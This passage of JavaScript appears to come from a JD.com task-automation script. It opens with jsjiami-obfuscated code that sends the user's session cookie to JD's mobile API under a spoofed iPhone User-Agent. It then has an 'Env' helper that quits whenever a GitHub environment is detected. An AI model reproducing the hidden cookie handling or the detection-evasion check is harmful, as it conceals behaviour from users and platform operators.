_0xd1b6f0(_0xa50bb5);},'FRujL':_0x58e0('4c','IVN]'),'nGNXz':'jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2\x20CFNetwork/1206\x20Darwin/20.1.0','wCPAJ':_0x58e0('4d','Ti^x')};return{'url':''+JD_API_HOST,'body':_0x58e0('4e','1Dd#')+_0x5729b2+_0x58e0('4f','IXBL')+_0x17c64c[_0x58e0('50','(d!W')](escape,JSON[_0x58e0('51','(d!W')](_0x339ce3))+'&client=wh5&clientVersion=1.0.0','headers':{'Cookie':cookie,'Host':'api.m.jd.com','Connection':_0x17c64c[_0x58e0('52','CN)m')],'Content-Type':_0x17c64c['PpzWJ'],'User-Agent':$[_0x58e0('53','ckSC')]()?process[_0x58e0('54','sy)F')][_0x58e0('55','sY*x')]?process['env'][_0x58e0('56','zVz9')]:_0x17c64c[_0x58e0('57','ckSC')](require,_0x58e0('58','8n9o'))[_0x58e0('59','Inq]')]:$[_0x58e0('5a','otPF')]('JDUA')?$[_0x58e0('5b','6jyC')](_0x17c64c[_0x58e0('5c','FAg*')]):_0x17c64c[_0x58e0('5d','CnYd')],'Accept-Language':_0x58e0('16','(d!W'),'Accept-Encoding':_0x17c64c[_0x58e0('5e',')V0X')]}};};_0xodC='jsjiami.com.v6';
 function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
